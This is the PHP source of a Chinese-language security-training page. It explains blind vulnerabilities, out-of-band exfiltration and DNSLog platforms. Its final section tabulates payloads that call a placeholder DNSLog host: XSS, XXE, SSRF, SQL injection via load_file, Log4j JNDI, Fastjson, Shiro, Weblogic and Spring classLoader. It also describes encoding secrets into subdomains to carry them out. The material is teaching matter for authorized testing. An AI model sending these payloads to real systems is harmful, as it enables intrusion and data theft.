<?php
/**
 * bafanglab - 模块1：Burp 抓包基本功 · OOB 和 DNSLog（纯教学页）
 * 版权所有：八方网域-无涯
 *
 * 本页不含练习操作，讲清无回显 / 盲打 / 带外数据外带（OOB）的概念，
 * 以及 DNSLog 的原理、常见平台与可验证的漏洞清单。
 * 「DNSLog 平台可以验证的漏洞」一节整理自八方网域 wiki：https://wiki.bafangwy.com/doc/691/
 */
require_once dirname(dirname(__DIR__)) . '/includes/i18n.php';
$page_title = 'OOB和DNSLog';
$page_no_level_badge = true; // 纯知识页：标题不追加「N levels」徽标
require_once dirname(dirname(__DIR__)) . '/includes/header.php';
?>
<a class="back-link" href="<?php echo BASE_URL; ?>/index.php">&larr; <?php echo t('footer.back'); ?></a>

<div class="panel">
    <h2><?php echo 'OOB和DNSLog'; ?></h2>
    <?php burp_basic_tabs('tab.burp_dnslog'); ?>

    <p class="desc">
        <?php echo '有些漏洞不会把结果回显在页面上：命令执行没有输出、SSRF 的响应被丢弃、盲注只能靠猜。
        这时需要换一条「看不见但能证明」的通道——带外数据外带（OOB），而 DNSLog 是最常用、最轻量的一种。'; ?>
    </p>

    <h4><?php echo '一、无回显、盲打、OOB 分别是什么'; ?></h4>
    <div class="result">
        <table>
            <tr>
                <th style="width:150px"><?php echo '概念'; ?></th>
                <th><?php echo '含义'; ?></th>
                <th style="width:300px"><?php echo '典型场景'; ?></th>
            </tr>
            <tr>
                <td><strong><?php echo '无回显'; ?></strong></td>
                <td><?php echo '漏洞确实触发了，但服务器没有把执行结果返回到你能看到的位置（页面、响应头、报错都没有）。'; ?></td>
                <td><?php echo '命令执行不回显、SSRF 不返回内容、盲注无布尔差异。'; ?></td>
            </tr>
            <tr>
                <td><strong><?php echo '盲打'; ?></strong></td>
                <td><?php echo '在看不到结果的前提下，通过侧信道（时间、状态码、报错差异、外带请求）判断条件真假，逐位推断数据。'; ?></td>
                <td><?php echo '布尔盲注、时间盲注、盲命令执行、盲 SSRF。'; ?></td>
            </tr>
            <tr>
                <td><strong><?php echo 'OOB（带外）'; ?></strong></td>
                <td><?php echo '让目标主动向攻击者控制的第三方地址发起请求，通过第三方收到的记录来确认漏洞触发并外带数据。'; ?></td>
                <td><?php echo 'DNSLog、HTTP 回连、邮件外带、SMB 外带。'; ?></td>
            </tr>
        </table>
    </div>
    <div class="doc-note">
        <?php echo '关系可以理解为：<b>无回显</b>是问题，<b>盲打</b>是思路，<b>OOB</b> 是解决无回显问题的一种手段。
        OOB 不一定只能靠 DNS——HTTP、SMTP、SMB 都可以，但在目标只放行 DNS 出网时，DNSLog 最稳。'; ?>
    </div>

    <h4><?php echo '二、DNSLog 的原理'; ?></h4>
    <div class="result">
        <ul class="doc-step">
            <li><b>先申请一个可解析的子域名：</b>DNSLog 平台为每次测试生成随机子域名，例如 <code>abcdef.dnslog.cn</code>，并把该域名的解析权交给平台服务器。</li>
            <li><b>把域名塞进 payload：</b>文件读取、命令执行、SSRF、反序列化等 payload 里让目标去访问这个域名。</li>
            <li><b>目标触发解析：</b>目标服务器执行到 payload 时，操作系统/解析器会向该域名发起 DNS 查询。</li>
            <li><b>平台记录查询：</b>DNSLog 服务器收到查询后记录「哪个域名、什么时间、来源 IP」，你在平台页面上就能看到这条记录，说明漏洞已被触发。</li>
        </ul>
        <p><b>为什么 DNS 常常能出网：</b></p>
        <ul class="doc-step">
            <li><b>不受同源策略约束：</b>同源策略只限制浏览器里的 JavaScript 读取跨域响应，服务器端代码（SSRF、XXE、命令执行）发起请求时根本不经过浏览器，也就没有同源限制。</li>
            <li><b>防火墙通常放行 DNS：</b>绝大多数生产环境需要持续解析域名，防火墙/代理往往允许 53 端口（UDP/TCP）出网，而 HTTP/HTTPS 出网可能被代理、白名单或 DLP 拦截。</li>
            <li><b>协议轻、握手少：</b>DNS 是一次 UDP 查询即可完成，不需要 TCP 三次握手、TLS 证书校验，也不容易被 WAF 检查内容。</li>
            <li><b>可携带少量数据：</b>把要外带的内容编码进子域名（如 <code>base64(secret).abcdef.dnslog.cn</code>），平台记录里就能看到。受域名长度限制，通常需要分段多次外带。</li>
        </ul>
        <p><b>为什么优先用域名解析而不是 HTTP 回连：</b>HTTP 回连要求目标能建立到公网的 TCP 连接、能完成 TLS（很多内网环境没有外网直连或证书校验失败），还容易被出口防火墙和 WAF 记录；DNS 解析通常由系统解析器自动完成，即使业务代码只能发起一个 URL 请求，也能在发起阶段被 DNS 记录捕获。另外 DNS 记录噪音低、部署简单，适合快速验证「到底触发没触发」。</p>
    </div>

    <h4><?php echo '三、常见 DNSLog / 带外平台'; ?></h4>
    <div class="result">
        <table>
            <tr>
                <th style="width:200px"><?php echo '平台'; ?></th>
                <th><?php echo '特点与用法要点'; ?></th>
            </tr>
            <tr>
                <td><b>Burp Collaborator</b><?php echo '（协作器）'; ?></td>
                <td><?php echo 'Burp Suite 自带，生成随机子域名，支持 DNS / HTTP / SMTP 多种协议，记录直接显示在 Burp 中，适合与 Repeater、Intruder 联动。属于 Burp Pro 功能；部分新版入口有变化，找不到时可查官方文档或社区说明（wiki: https://wiki.bafangwy.com/doc/762/）。'; ?></td>
            </tr>
            <tr>
                <td><b>dnslog.cn</b></td>
                <td><?php echo '免费、免注册，打开网页即可获取随机域名并查看解析记录；国内访问速度快，记录保留时间较短，适合快速验证。'; ?></td>
            </tr>
            <tr>
                <td><b>ceye.io</b></td>
                <td><?php echo '需要注册，提供 DNS 与 HTTP 记录，记录持久、支持 API 查询，适合团队协作与较长周期的测试。'; ?></td>
            </tr>
            <tr>
                <td><b>dnslog.pw/dns</b></td>
                <td><?php echo '在线 DNSLog 平台，界面简单，生成子域名后把域名放进 payload 即可，适合临时验证。'; ?></td>
            </tr>
            <tr>
                <td><b>eyes.sh/dns</b></td>
                <td><?php echo '免费 DNSLog 服务，支持自定义记录与多子域名管理，适合需要多次测试的场景。'; ?></td>
            </tr>
            <tr>
                <td><b>webhook.site</b></td>
                <td><?php echo '通用 HTTP 回连平台，为每次访问生成唯一 URL，可查看完整请求头与请求体；适合验证 SSRF/XXE 的 HTTP 出网，不适合只能触发 DNS 的目标。'; ?></td>
            </tr>
            <tr>
                <td><b>interact.sh</b></td>
                <td><?php echo 'ProjectDiscovery 提供的开源带外交互平台（可自建），支持 DNS / HTTP / SMTP，常与 nuclei 等工具配合，适合批量检测与团队内网部署。'; ?></td>
            </tr>
        </table>
        <p><?php echo '提示：公开平台可能被安全设备识别、屏蔽或限流；正式项目建议自建 DNSLog（如 DNSlog-GO），并只在内网或授权范围内使用。'; ?></p>
    </div>

    <h4><?php echo '四、DNSLog 平台可以验证的漏洞'; ?></h4>
    <p class="desc">
        <?php echo 'DNSLog 平台可以验证的漏洞：'; ?>
    </p>
    <div class="result">
        <table>
            <tr>
                <th style="width:210px"><?php echo '漏洞类型'; ?></th>
                <th><?php echo 'payload 示例'; ?></th>
            </tr>
            <tr>
                <td><?php echo 'XSS 漏洞'; ?></td>
                <td><pre>&lt;script src=http://qqq.abcdef.dnslog.cn&gt;&lt;/script&gt;</pre></td>
            </tr>
            <tr>
                <td><?php echo 'XXE 漏洞'; ?></td>
                <td><pre>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE root [&lt;!ENTITY % remote SYSTEM "http://wuyatest.abcdef.dnslog.cn"&gt;%remote;]&gt;</pre></td>
            </tr>
            <tr>
                <td><?php echo 'SSRF 漏洞'; ?></td>
                <td><pre>http://xxx.com/ssrf.php?url=http://abcdef.dnslog.cn</pre></td>
            </tr>
            <tr>
                <td><?php echo 'SQL 注入漏洞'; ?></td>
                <td><pre>http://localhost/sqli-labs/Less-5/?id=1' and if((select load_file(concat('////','qqq','.abcdef.dnslog.cn/wuya'))),1,0) --+</pre></td>
            </tr>
            <tr>
                <td><?php echo 'RCE 漏洞'; ?></td>
                <td><pre>abcdef.dnslog.cn</pre></td>
            </tr>
            <tr>
                <td><?php echo 'JNDI 注入 - Log4j2'; ?></td>
                <td><pre>http://xxx.com/cores?action=${jndi:ldap://abcdef.dnslog.cn}</pre></td>
            </tr>
            <tr>
                <td><?php echo '反序列化 - Fastjson 1.2.24'; ?></td>
                <td><pre>{"zeo":{"@type":"java.net.Inet4Address","val":"abcdef.dnslog.cn"}}</pre></td>
            </tr>
            <tr>
                <td><?php echo '反序列化 - Shiro'; ?></td>
                <td><pre>python shiro_poc.py "abcdef.dnslog.cn"</pre></td>
            </tr>
            <tr>
                <td><?php echo 'SSRF - Weblogic'; ?></td>
                <td><pre>operator=abcdef.dnslog.cn</pre></td>
            </tr>
            <tr>
                <td><?php echo 'Spring RCE 漏洞'; ?></td>
                <td><pre>http://xxx.com:8080/rce?class.module.classLoader.resources.context.configFile=http://spring-qqq.abcdef.dnslog.cn/test&amp;class.module.classLoader.resources.context.configFile.content.aaa=xxx</pre></td>
            </tr>
        </table>
    </div>
    <div class="doc-note">
        <?php echo '使用要点：先在本机 <code>ping abcdef.dnslog.cn</code> 验证平台能收到解析，再把域名替换进 payload；
        触发后刷新平台页面查看记录。记录里的来源 IP 是目标服务器的出口 IP，可用于判断网段与内网位置。'; ?>
    </div>
</div>

<?php level_nav(1, 1); ?>

<?php require_once dirname(dirname(__DIR__)) . '/includes/footer.php'; ?>
